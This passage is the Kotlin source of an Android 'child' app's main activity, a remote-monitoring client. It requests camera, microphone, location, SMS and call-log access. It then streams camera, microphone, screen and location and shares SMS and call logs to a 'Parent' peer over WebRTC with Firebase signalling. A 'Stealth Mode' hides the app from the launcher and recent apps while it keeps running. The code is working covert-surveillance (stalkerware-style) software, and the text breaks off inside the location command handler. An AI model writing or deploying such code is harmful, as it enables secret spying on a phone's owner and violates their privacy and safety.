package com.soumo.child

/* ─── imports ─────────────────────────────────────────────────────────────── */
import android.Manifest
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.FirebaseDatabase
import com.google.gson.Gson
import com.soumo.child.calllog.CallLogSharing
import com.soumo.child.camera.CameraController
import com.soumo.child.id.DeviceIdManager
import com.soumo.child.microphone.MicrophoneController
import com.soumo.child.service.BackgroundService
import com.soumo.child.signaling.PeerRole
import com.soumo.child.signaling.SignalingClient
import com.soumo.child.sms.SmsSharing
import com.soumo.child.ui.ConnectionStatusView
import com.soumo.child.ui.theme.ChildTheme
import com.soumo.child.utils.BatteryOptimizationHelper
import com.soumo.child.webrtc.PeerObserver
import com.soumo.child.webrtc.PhantomPeerManager
import com.soumo.child.webstreaming.ScreenStreamer
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.webrtc.DataChannel
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import androidx.core.content.edit
import androidx.core.net.toUri

class MainActivity : AppCompatActivity() {

    /* ─── singletons ──────────────────────────────────────────────────────── */
    private var peerMgr:      PhantomPeerManager? = null
    private var signaling:    SignalingClient? = null
    private var cameraCtrl:   CameraController? = null
    private var micCtrl:      MicrophoneController? = null
    private var screenStreamer: ScreenStreamer? = null
    private var smsSharing: SmsSharing? = null
    private var dataChannel: DataChannel? = null
    private var callLogSharing: CallLogSharing? = null
    private var healthCheckJob: kotlinx.coroutines.Job? = null
    private var reconnectionJob: kotlinx.coroutines.Job? = null
    private var isReconnecting = false
    private var reconnectionAttempts = 0
    private val maxReconnectionAttempts = 3
    private var persistentRoomId: String? = null
    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    // Location-related variables
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var locationCallback: LocationCallback? = null
    private var locationRequest: LocationRequest? = null
    private var isLocationTracking = false

    // Activity result launcher for screen capture
    private val screenCaptureResultLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        screenStreamer?.onPermissionResult(result.resultCode, result.data)
    }

    /** Switch to ANSWERER on the Parent side */
    private val peerRole = PeerRole.OFFERER

    // Stealth mode state
    private lateinit var stealthActivated: MutableState<Boolean>

    /* ─── lifecycle ───────────────────────────────────────────────────────── */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Initialize stealth mode state
        stealthActivated = mutableStateOf(false)

        // Initialize location client
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupLocationRequest()

        // Request all permissions on app startup
        requestAllPermissions()

        // Ensure device ID is generated before starting background service
        lifecycleScope.launch {
            try {
                val phantomPrefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
                val existingDeviceId = phantomPrefs.getString("device_id", null)
                
                val deviceId = if (existingDeviceId != null) {
                    Log.d("MainActivity", "Using existing device ID: $existingDeviceId")
                    existingDeviceId
                } else {
                    val newDeviceId = DeviceIdManager.generateUniqueDeviceId(this@MainActivity)
                    Log.d("MainActivity", "Device ID generated: $newDeviceId")
                    
                    // Explicitly store device ID to ensure consistency
                    phantomPrefs.edit { putString("device_id", newDeviceId) }
                    Log.d("MainActivity", "Device ID stored in SharedPreferences: $newDeviceId")
                    newDeviceId
                }
                
                // Set persistent room ID
                persistentRoomId = DeviceIdManager.format(deviceId)
                Log.d("MainActivity", "Loaded persistent room ID: $persistentRoomId")
                
                // Ensure device ID is stored before starting background service
                delay(1000) // Give SharedPreferences time to save
                BackgroundService.startService(this@MainActivity)
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to generate device ID", e)
                // Still start service, it will wait for ID generation
                BackgroundService.startService(this@MainActivity)
            }
        }

        // Check battery optimization and auto-start permissions
        checkBatteryOptimization()
        checkAutoStartPermission()

        setContent {
            ChildTheme {
                var status by remember { mutableStateOf("Initializing…") }
                var childId by remember { mutableStateOf("") }
                var showStealthDialog by remember { mutableStateOf(false) }
                // Use class-level stealthActivated directly
                val stealthActivatedState = stealthActivated

                Scaffold(
                    topBar = {
                        Row(
                            Modifier.fillMaxWidth().padding(8.dp),
                            horizontalArrangement = Arrangement.End,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Button(
                                onClick = { showStealthDialog = true },
                                enabled = !stealthActivatedState.value,
                                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                            ) {
                                Text("Stealth Mode")
                            }
                        }
                    }
                ) { pad ->
                    ConnectionStatusView(status, childId, Modifier.padding(pad))
                }

                if (showStealthDialog) {
                    AlertDialog(
                        onDismissRequest = { showStealthDialog = false },
                        title = { Text("Stealth Mode") },
                        text = { Text("Stealth mode will hide this app from the launcher and recent apps, but it will keep running in the background. You can only bring it back by reinstalling or using ADB.") },
                        confirmButton = {
                            Button(onClick = {
                                showStealthDialog = false
                                activateStealthMode()
                                stealthActivatedState.value = true
                            }) { Text("Stealth") }
                        },
                        dismissButton = {
                            OutlinedButton(onClick = { showStealthDialog = false }) { Text("Cancel") }
                        }
                    )
                }

                LaunchedEffect(Unit) {
                    Log.d("MainActivity", "Starting connection process...")
                    launch {
                        try {
                            // Wait for device ID to be available
                            val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
                            var deviceId: String? = null
                            var attempts = 0
                            
                            while (deviceId == null && attempts < 10) {
                                deviceId = prefs.getString("device_id", null)
                                if (deviceId == null) {
                                    delay(500) // Wait 500ms
                                    attempts++
                                }
                            }
                            
                            if (deviceId != null) {
                                startConnection({ status = it }, { childId = it })
                                Log.d("MainActivity", "Connection process completed")
                            } else {
                                throw IllegalStateException("Device ID not available after waiting")
                            }
                        } catch (e: Exception) {
                            Log.e("MainActivity", "Connection process failed", e)
                            status = "❌ Connection failed: ${e.message}"
                        }
                    }
                }
            }
        }
    }

    /* ─── Permission Management ───────────────────────────────────────────── */
    private fun requestAllPermissions() {
        val permissions = mutableListOf<String>()

        // Add all required permissions
        permissions.add(Manifest.permission.CAMERA)
        permissions.add(Manifest.permission.RECORD_AUDIO)
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        permissions.add(Manifest.permission.READ_SMS)
        permissions.add(Manifest.permission.RECEIVE_SMS)
        permissions.add(Manifest.permission.READ_CALL_LOG)

        // Add notification permission for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // Check which permissions are not granted
        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            Log.d("Permissions", "Requesting permissions: ${permissionsToRequest.joinToString()}")
            ActivityCompat.requestPermissions(this, permissionsToRequest, 9999)
        } else {
            Log.d("Permissions", "All permissions already granted")
        }
    }

    private fun shouldShowPermissionRationale(permission: String): Boolean {
        return ActivityCompat.shouldShowRequestPermissionRationale(this, permission)
    }

    private fun requestPermissionWithFallback(permission: String, requestCode: Int, featureName: String) {
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            Log.d("Permission", "$featureName permission already granted")
            return
        }

        // Check if we should show the permission rationale
        val shouldShowRationale = shouldShowPermissionRationale(permission)

        if (shouldShowRationale) {
            // User denied permission but didn't check "Don't ask again" - dialog will show
            Log.d("Permission", "Requesting $featureName permission (dialog will be shown)")
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        } else {
            // User denied permission and checked "Don't ask again" or denied multiple times
            Log.w("Permission", "$featureName permission dialog will NOT be shown - user denied multiple times or selected 'Don't ask again'")
            sendDataChannelMessage("${featureName.uppercase()}_PERMISSION_NEEDS_SETTINGS")

            // Show dialog to guide user to settings
            showPermissionSettingsDialog(featureName)

            // Still try to request (in case it's the first time)
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            val uri = Uri.fromParts("package", packageName, null)
            intent.data = uri
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Log.d("Settings", "Opening app settings")
        } catch (e: Exception) {
            Log.e("Settings", "Failed to open app settings", e)
        }
    }

    private fun showPermissionSettingsDialog(featureName: String) {
        runOnUiThread {
            androidx.appcompat.app.AlertDialog.Builder(this)
                .setTitle("Permission Required")
                .setMessage("$featureName permission is required but has been denied multiple times. Please grant the permission manually in the app settings.")
                .setPositiveButton("Open Settings") { _, _ ->
                    openAppSettings()
                }
                .setNegativeButton("Cancel") { dialog, _ ->
                    dialog.dismiss()
                }
                .setCancelable(false)
                .show()
        }
    }

    private fun checkPermissionStatus() {
        val permissions = mapOf(
            "CAMERA" to Manifest.permission.CAMERA,
            "MICROPHONE" to Manifest.permission.RECORD_AUDIO,
            "LOCATION" to Manifest.permission.ACCESS_FINE_LOCATION,
            "SMS" to Manifest.permission.READ_SMS,
            "CALL_LOG" to Manifest.permission.READ_CALL_LOG
        )

        val status = permissions.map { (name, permission) ->
            val granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            val canShowDialog = shouldShowPermissionRationale(permission)
            "$name:${if (granted) "GRANTED" else "DENIED"}:${if (canShowDialog) "CAN_SHOW" else "CANNOT_SHOW"}"
        }.joinToString("|")

        sendDataChannelMessage("PERMISSION_STATUS:$status")
        Log.d("Permission", "Permission status: $status")
    }

    /* ─── bootstrap signalling / WebRTC ───────────────────────────────────── */
    @SuppressLint("SuspiciousIndentation")
    private fun startConnection(updateStatus: (String) -> Unit, updateChildId: (String) -> Unit) {
        Log.d("MainActivity", "startConnection called")
        try {
            /* 0️⃣  room / device ID ------------------------------------------------- */
            // Use persistent room ID if available, otherwise use device ID from SharedPreferences
            val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
            val rawRoomId = if (persistentRoomId != null) {
                Log.d("Connection", "Using persistent room ID: $persistentRoomId")
                // Convert formatted ID back to raw ID for Firebase path
                persistentRoomId!!.replace("-", "")
            } else {
                // Use device ID already generated by the early lifecycleScope launch
                val existingId = prefs.getString("device_id", null)
                if (existingId != null) {
                    Log.d("Connection", "Using existing device ID from SharedPreferences: $existingId")
                    val formattedRoomId = DeviceIdManager.format(existingId)
                    persistentRoomId = formattedRoomId
                    Log.d("Connection", "Using formatted room ID: $formattedRoomId")
                    existingId
                } else {
                    Log.e("Connection", "No device ID found in SharedPreferences - waiting for MainActivity to complete generation")
                    // Don't generate a new ID - this should not happen with proper flow
                    throw IllegalStateException("Device ID not found in SharedPreferences. Ensure MainActivity has completed device ID generation.")
                }
            }

            updateChildId(DeviceIdManager.format(rawRoomId)) // Display formatted ID
            updateStatus("Connection initialized")
            Log.d("Connection", "Using raw room ID for Firebase: $rawRoomId")
            Log.d("Connection", "Displaying formatted room ID: ${DeviceIdManager.format(rawRoomId)}")

            /* 1️⃣  PeerObserver (ICE + DataChannel text) --------------------------- */
            var sigRef: SignalingClient? = null
            val observer = PeerObserver(
                onIce = { /* No-op for Non-Trickle ICE */ },
                onData = { cmd -> handleCommand(cmd) },
                onConnectionStateChange = { state ->
                    Log.d("ConnectionState", "Connection state changed: $state")
                    when (state) {
                        PeerConnection.PeerConnectionState.CONNECTED -> {
                            updateStatus("✅ Connected")
                            // Reset reconnection attempts on successful connection
                            reconnectionAttempts = 0
                            isReconnecting = false
                            reconnectionJob?.cancel()
                            reconnectionJob = null
                            Log.d("ConnectionState", "Connection established, reconnection state reset")
                        }
                        PeerConnection.PeerConnectionState.DISCONNECTED -> {
                            // Only update UI if we're not in the middle of a restart
                            if (!isReconnecting) {
                                updateStatus("⚠️ Disconnected - waiting for reconnection...")
                            }
                            // Don't trigger reconnection here - let DataChannel handle it
                            Log.d("ConnectionState", "PeerConnection disconnected - DataChannel will handle reconnection")
                        }
                        PeerConnection.PeerConnectionState.FAILED -> {
                            // Only update UI if we're not in the middle of a restart
                            if (!isReconnecting) {
                                updateStatus("❌ Connection failed")
                            }
                            Log.d("ConnectionState", "PeerConnection failed - DataChannel will handle reconnection")
                        }
                        PeerConnection.PeerConnectionState.CLOSED -> {
                            // Only update UI if we're not in the middle of a restart
                            if (!isReconnecting) {
                                updateStatus("🔒 Connection closed")
                            }
                            Log.d("ConnectionState", "PeerConnection closed - DataChannel will handle reconnection")
                        }
                        else -> {
                            updateStatus("🔄 Connection state: $state")
                        }
                    }
                }
            )

            /* 2️⃣  PeerConnection -------------------------------------------------- */
            // Always recreate peer manager during reconnection to ensure clean state
            peerMgr?.let {
                Log.d("PeerManager", "Closing existing peer manager...")
                it.getPeerConnection()?.close()
            }

            Log.d("PeerManager", "Creating new peer manager...")
            peerMgr = PhantomPeerManager(this, observer).apply {
                initializePeerConnectionFactory()
                createPeerConnection(
                    listOf(
                        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
                    )
                )
            }
            Log.d("PeerManager", "New peer manager created successfully")

            /* 3️⃣  Camera controller (idle) --------------------------------------- */
            // Always recreate controllers during reconnection to ensure clean state
            cameraCtrl?.stopCamera()
            cameraCtrl = CameraController(
                this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()
            )
            Log.d("Controllers", "Camera controller recreated")

            /* 3️⃣  Microphone controller (idle) ----------------------------------- */
            // Always recreate controllers during reconnection to ensure clean state
            micCtrl?.stopMicrophone()
            micCtrl = MicrophoneController(
                this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()
            )

            // Set up renegotiation callback
            micCtrl!!.setRenegotiationCallback {
                performWebRTCRenegotiation()
            }
            Log.d("Controllers", "Microphone controller recreated")

            // Always recreate screen streamer during reconnection to ensure clean state
            screenStreamer?.stop()
            screenStreamer = ScreenStreamer(
                this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()!!
            )

            // Set up status callback to send messages to parent
            screenStreamer!!.setStatusCallback { status ->
                sendDataChannelMessage(status)
            }

            // Set up renegotiation callback
            screenStreamer!!.setRenegotiationCallback {
                performWebRTCRenegotiation()
            }

            // Set up activity result launcher
            screenStreamer!!.setActivityResultLauncher(screenCaptureResultLauncher)
            Log.d("Controllers", "Screen streamer recreated")

            /* 4️⃣  Firebase RTDB signalling --------------------------------------- */
            Log.d("Signaling", "Creating SignalingClient with roomId: $rawRoomId")
            signaling = SignalingClient(
                roomId = rawRoomId,
                role   = peerRole,

                onOfferReceived = { offer ->
                    if (peerRole == PeerRole.ANSWERER) {
                        updateStatus("📥 Offer")
                        peerMgr!!.setRemoteDescription(offer, logSdp("SetRemoteOffer"))
                        coroutineScope.launch {
                            val answer = peerMgr!!.createNonTrickleAnswer()
                            if (answer != null) {
                                signaling!!.sendAnswer(answer)
                                updateStatus("📤 Answer sent")
                            } else {
                                updateStatus("❌ Answer creation failed")
                            }
                        }
                    }
                },

                onAnswerReceived = { ans ->
                    if (peerRole == PeerRole.OFFERER) {
                        peerMgr!!.getPeerConnection()?.let { pc ->
                            if (pc.signalingState() == PeerConnection.SignalingState.HAVE_LOCAL_OFFER) {
                                updateStatus("📥 Answer")
                                peerMgr!!.setRemoteDescription(ans, logSdp("SetRemoteAnswer"))
                            } else {
                                Log.w("Signaling", "⚠️  Ignoring stale answer, state = ${pc.signalingState()}")
                            }
                        }
                    }
                },

                onIceCandidate = { /* No-op for Non-Trickle ICE */ }
            )
            sigRef = signaling

            /* 5️⃣  If OFFERER → cleanup old nodes → create DataChannel → send offer */
            Log.d("Connection", "Checking peer role: $peerRole")
            if (peerRole == PeerRole.OFFERER) {
                updateStatus("Creating offer…")
                Log.d("Connection", "Role is OFFERER, proceeding with offer creation")

                // 🧹 Clean up any leftover signaling data from previous sessions
                Log.d("Firebase", "Cleaning up Firebase data for room: $rawRoomId")
                Log.d("Firebase", "Firebase path: calls/$rawRoomId")
                FirebaseDatabase.getInstance(AppConfig.Firebase.DATABASE_URL)
                    .reference.child(AppConfig.Firebase.CALLS_PATH).child(rawRoomId).apply {
                        removeValue() // Remove all data including offer
                        Log.d("Firebase", "Firebase data cleaned up")
                    }

                Log.d("Connection", "Creating DataChannel...")
                dataChannel = peerMgr!!.getPeerConnection()?.createDataChannel(
                    "cmd",
                    DataChannel.Init().apply { ordered = true }
                )
                Log.d("Connection", "DataChannel created: ${dataChannel != null}")
                dataChannel?.registerObserver(object : DataChannel.Observer {
                    override fun onStateChange() {
                        val state = dataChannel?.state()
                        Log.d("DataChannel", "State changed: $state")

                        when (state) {
                            DataChannel.State.OPEN -> {
                                Log.d("DataChannel", "DataChannel opened")
                                // Start health check when data channel opens
                                startHealthCheck()
                            }
                            DataChannel.State.CLOSED -> {
                                Log.d("DataChannel", "DataChannel closed - parent disconnected")
                                // Stop health check
                                stopHealthCheck()
                                // Restart the entire connection process
                                if (!isReconnecting) {
                                    Log.d("DataChannel", "Parent disconnected - restarting connection...")
                                    restartConnection()
                                } else {
                                    Log.d("DataChannel", "Connection restart already in progress")
                                }
                            }
                            else -> {
                                Log.d("DataChannel", "DataChannel state: $state")
                            }
                        }
                    }
                    override fun onBufferedAmountChange(l: Long) {}
                    override fun onMessage(buf: DataChannel.Buffer) {
                        val data = ByteArray(buf.data.remaining()).also { buf.data.get(it) }
                        handleCommand(String(data, Charsets.UTF_8))
                        initializeSmsSharing()
                        initializeCallLogSharing()

                        // 🌟 Initialize SmsSharing if not done
                        if (smsSharing == null && dataChannel != null) {
                            smsSharing = SmsSharing(this@MainActivity, dataChannel!!)
                            Log.d("SMS", "SmsSharing initialized via data channel observer")
                        }
                    }
                })

                Log.d("Offer", "Creating new offer for reconnection...")
                coroutineScope.launch {
                    val offer = peerMgr!!.createNonTrickleOffer()
                    if (offer != null) {
                        signaling!!.sendOffer(offer)
                        updateStatus("📤 Offer sent")
                        Log.d("Offer", "Offer sent to Firebase successfully")
                    } else {
                        updateStatus("❌ Offer creation failed")
                    }
                }
            } else updateStatus("Waiting for offer…")
        } catch (e: Exception) {
            Log.e("MainActivity", "Error in startConnection", e)
            updateStatus("❌ Connection error: ${e.message}")
            throw e
        }
    }

    /* ─── connection restart process ─────────────────────────────────────── */
    private fun restartConnection() {
        Log.d("Restart", "Starting connection restart process...")

        // Prevent multiple simultaneous restarts
        if (isReconnecting) {
            Log.d("Restart", "Restart already in progress, skipping...")
            return
        }

        isReconnecting = true

        // Cancel any existing jobs
        reconnectionJob?.cancel()
        healthCheckJob?.cancel()

        reconnectionJob = coroutineScope.launch {
            try {
                Log.d("Restart", "Starting restart job...")

                // Clean up current connection
                Log.d("Restart", "Cleaning up current connection...")
                cleanupCurrentConnection()

                // Small delay to ensure cleanup is complete
                Log.d("Restart", "Waiting 2 seconds after cleanup...")
                delay(2000)

                // Check if we're still supposed to be restarting
                if (!isReconnecting) {
                    Log.d("Restart", "Restart cancelled, stopping...")
                    return@launch
                }

                // Restart the entire connection process
                Log.d("Restart", "Calling startConnection to restart...")
                startConnection(
                    { status ->
                        Log.d("Restart", "Connection status: $status")
                        // Update UI state - this will be handled by the calling context
                    },
                    { childId ->
                        Log.d("Restart", "Child ID updated: $childId")
                        // Update UI state - this will be handled by the calling context
                    }
                )
                Log.d("Restart", "startConnection completed")

                // If we get here, restart was successful
                Log.d("Restart", "Connection restart completed successfully")
                isReconnecting = false
                reconnectionAttempts = 0 // Reset counter on success

            } catch (_: CancellationException) {
                Log.d("Restart", "Restart job was cancelled")
                isReconnecting = false
            } catch (e: Exception) {
                Log.e("Restart", "Connection restart failed", e)
                // Update UI state - this will be handled by the calling context
                isReconnecting = false
            }
        }
    }

    /* ─── reconnection process (legacy - keeping for compatibility) ───────── */
    private fun startReconnectionProcess(updateStatus: (String) -> Unit, updateChildId: (String) -> Unit) {
        // Prevent multiple simultaneous reconnection attempts
        if (isReconnecting) {
            Log.d("Reconnection", "Reconnection already in progress, skipping...")
            return
        }

        // Check if we've exceeded max attempts
        if (reconnectionAttempts >= maxReconnectionAttempts) {
            Log.w("Reconnection", "Max reconnection attempts reached, stopping reconnection")
            updateStatus("❌ Max reconnection attempts reached - please restart app")
            return
        }

        // Check if the activity is being destroyed
        if (isFinishing || isDestroyed) {
            Log.d("Reconnection", "Activity is being destroyed, skipping reconnection")
            return
        }

        // Check if we're already connected
        if (dataChannel?.state() == DataChannel.State.OPEN &&
            peerMgr?.getPeerConnection()?.connectionState() == PeerConnection.PeerConnectionState.CONNECTED) {
            Log.d("Reconnection", "Already connected, no reconnection needed")
            return
        }

        Log.d("Reconnection", "Starting reconnection process (attempt ${reconnectionAttempts + 1}/${maxReconnectionAttempts})...")

        isReconnecting = true
        reconnectionAttempts++

        // Cancel any existing reconnection job
        reconnectionJob?.cancel()

        reconnectionJob = coroutineScope.launch {
            try {
                Log.d("Reconnection", "Starting reconnection job...")

                // Clean up current connection
                cleanupCurrentConnection()

                // Small delay to ensure cleanup is complete
                delay(1000)

                // Check if we're still supposed to be reconnecting
                if (!isReconnecting) {
                    Log.d("Reconnection", "Reconnection cancelled, stopping...")
                    return@launch
                }

                // Attempt reconnection
                Log.d("Reconnection", "Calling startConnection...")
                startConnection(updateStatus, updateChildId)
                Log.d("Reconnection", "startConnection completed")

                // If we get here, reconnection was successful
                Log.d("Reconnection", "Reconnection attempt completed successfully")
                isReconnecting = false
                reconnectionAttempts = 0 // Reset counter on success

            } catch (_: CancellationException) {
                Log.d("Reconnection", "Reconnection job was cancelled")
                isReconnecting = false
            } catch (e: Exception) {
                Log.e("Reconnection", "Reconnection attempt $reconnectionAttempts failed", e)
                updateStatus("❌ Reconnection failed (${reconnectionAttempts}/${maxReconnectionAttempts}) - retrying...")

                // If we haven't reached max attempts, try again after a delay
                if (reconnectionAttempts < maxReconnectionAttempts) {
                    delay(3000) // Wait 3 seconds before next attempt
                    isReconnecting = false // Reset flag to allow retry
                    startReconnectionProcess(updateStatus, updateChildId)
                } else {
                    Log.w("Reconnection", "Max reconnection attempts reached")
                    updateStatus("❌ Max reconnection attempts reached - please restart app")
                    isReconnecting = false
                }
            }
        }
    }

    private fun cleanupCurrentConnection() {
        Log.d("Cleanup", "Cleaning up current connection...")

        try {
            // Stop health check
            stopHealthCheck()
            // Don't stop reconnection here as it might be called from restart process

            // Clean up signaling
            signaling?.cleanup()
            signaling = null

            // Clean up data channel
            dataChannel?.close()
            dataChannel = null

            // Clean up peer connection
            peerMgr?.getPeerConnection()?.close()

            // Clean up controllers
            cameraCtrl?.stopCamera()
            micCtrl?.stopMicrophone()
            screenStreamer?.stop()

            // Clean up sharing services
            smsSharing?.stopSharing()
            smsSharing = null
            callLogSharing?.stopSharing()
            callLogSharing = null

            Log.d("Cleanup", "Connection cleanup completed")
        } catch (e: Exception) {
            Log.e("Cleanup", "Error during cleanup", e)
        }
    }

    /* ─── health check ──────────────────────────────────────────────────── */
    private fun startHealthCheck() {
        stopHealthCheck() // Stop any existing health check

        healthCheckJob = coroutineScope.launch {
            while (true) {
                delay(30000) // Check every 30 seconds

                // Check if data channel is still open
                if (dataChannel?.state() != DataChannel.State.OPEN && !isReconnecting) {
                    Log.d("HealthCheck", "DataChannel not open - restarting connection")
                    restartConnection()
                    break
                }

                // Send a ping to check if parent is responsive
                try {
                    sendDataChannelMessage("PING_CHILD")
                    Log.d("HealthCheck", "Sent ping to parent")
                } catch (e: Exception) {
                    Log.e("HealthCheck", "Failed to send ping", e)
                    // If we can't send a message, the connection might be broken
                    if (!isReconnecting) {
                        restartConnection()
                    }
                    break
                }
            }
        }
    }

    private fun stopHealthCheck() {
        healthCheckJob?.cancel()
        healthCheckJob = null
    }

    /* ─── command dispatch (from Parent) ──────────────────────────────────────────────────── */
    private fun handleCommand(cmd: String) {
        try {
            // Try to parse as JSON
            val json = try { org.json.JSONObject(cmd) } catch (_: Exception) { null }
            val command = json?.optString("cmd") ?: cmd.trim()
            val since = json?.optLong("since", 0L) ?: 0L

            when (command) {
                //Camera Commands
                "CAMERA_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            cameraCtrl?.startCamera()
                            sendDataChannelMessage("CAMERA_STARTED")
                            Log.d("Command", "Camera started successfully")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start camera", e)
                            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                        }
                    } else {
                        requestPermissionWithFallback(Manifest.permission.CAMERA, 1001, "Camera")
                        sendDataChannelMessage("CAMERA_PERMISSION_REQUESTED")
                    }
                }
                "CAMERA_OFF" -> {
                    try {
                        cameraCtrl?.stopCamera()
                        sendDataChannelMessage("CAMERA_STOPPED")
                        Log.d("Command", "Camera stopped successfully")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop camera", e)
                        sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                    }
                }
                "CAMERA_SWITCH" -> {
                    try {
                        cameraCtrl?.switchCamera()
                        sendDataChannelMessage("CAMERA_SWITCHED")
                        Log.d("Command", "Camera switched successfully")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to switch camera", e)
                        sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                    }
                }
                //Mic Commands
                "MIC_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            micCtrl?.startMicrophone()
                            sendDataChannelMessage("MIC_STARTED")
                            Log.d("Command", "Microphone started successfully")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start microphone", e)
                            sendDataChannelMessage("MIC_ERROR: ${e.message}")
                        }
                    } else {
                        requestPermissionWithFallback(Manifest.permission.RECORD_AUDIO, 1002, "Microphone")
                        sendDataChannelMessage("MIC_PERMISSION_REQUESTED")
                    }
                }

                "MIC_OFF" -> {
                    try {
                        micCtrl?.stopMicrophone()
                        sendDataChannelMessage("MIC_STOPPED")
                        Log.d("Command", "Microphone stopped successfully")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop microphone", e)
                        sendDataChannelMessage("MIC_ERROR: ${e.message}")
                    }
                }

                //Screen Commands
                "SCREEN_ON" -> {
                    try {
                        Log.d("Command", "Requesting screen capture permission")
                        if (screenStreamer != null) {
                            // Check notification permission first (Android 13+)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                                    != PackageManager.PERMISSION_GRANTED) {
                                    requestPermissionWithFallback(Manifest.permission.POST_NOTIFICATIONS, 1003, "Notification")
                                    sendDataChannelMessage("SCREEN_PERMISSION_REQUESTED")
                                    return
                                }
                            }
                            screenStreamer!!.requestPermission(this)
                            sendDataChannelMessage("SCREEN_PERMISSION_REQUESTED")
                        } else {
                            Log.e("Command", "ScreenStreamer not initialized")
                            sendDataChannelMessage("SCREEN_CAPTURE_ERROR: Streamer not initialized")
                        }
                    } catch (e: Exception) {
                        Log.e("Command", "Error requesting screen capture", e)
                        sendDataChannelMessage("SCREEN_CAPTURE_ERROR: ${e.message}")
                    }
                }

                "SCREEN_OFF" -> {
                    try {
                        Log.d("Command", "Stopping screen capture")
                        if (screenStreamer != null) {
                            screenStreamer!!.stop()
                            sendDataChannelMessage("SCREEN_STOPPED")
                            Log.d("Command", "Screen capture stopped successfully")
                        } else {
                            Log.w("Command", "ScreenStreamer not initialized")
                            sendDataChannelMessage("SCREEN_ERROR: Streamer not initialized")
                        }
                    } catch (e: Exception) {
                        Log.e("Command", "Error stopping screen capture", e)
                        sendDataChannelMessage("SCREEN_CAPTURE_ERROR: ${e.message}")
                    }
                }

                //Location Commands
                "LOCATE_CHILD" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            startLocationTracking()
                            sendDataChannelMessage("LOCATION_STARTED")
                            Log.d("Command", "Location tracking started successfully")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start location tracking", e)
